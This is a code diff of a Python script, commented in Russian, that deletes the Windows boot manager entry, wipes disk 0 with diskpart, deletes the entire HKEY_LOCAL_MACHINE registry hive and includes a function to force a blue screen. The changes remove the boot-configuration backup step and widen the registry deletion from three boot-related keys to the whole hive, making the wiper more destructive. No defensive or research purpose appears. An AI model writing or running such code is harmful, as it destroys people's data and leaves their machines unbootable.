@@ -16,12 +16,12 @@ def run_command(command):
 
 def delete_bcd_entry():
     print("Удаление записи загрузчика Windows (BCD)...")
-    run_command("bcdedit /export C:\\bcdbackup")
     run_command("bcdedit /delete {bootmgr}")
 
 def clean_disk():
-    print("Очистка всех разделов с диска с помощью diskpart...")
+    print("Очистка C: диска с помощью diskpart...")
     script = '''select disk 0
+select partition 1
 clean
 '''
     script_path = "clean_disk_script.txt"
@@ -32,16 +32,11 @@ clean
     os.remove(script_path)
 
 def delete_windows_registry_keys():
-    print("Удаление записей реестра, связанных с Windows Boot Loader...")
-    registry_keys = [
-        r"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\BootControl",
-        r"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Boot",
-        r"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecureBoot"
-    ]
+    print("Удаление всех ключей реестра Windows...")
+    registry_key = r"HKEY_LOCAL_MACHINE"
     
-    for key in registry_keys:
-        print(f"Удаление ключа реестра: {key}")
-        run_command(f"reg delete \"{key}\" /f")
+    print(f"Удаление всего реестра {registry_key}")
+    run_command(f"reg delete \"{registry_key}\" /f /s /va")
 
 def trigger_bsod():
     print("Вызов синего экрана смерти...")
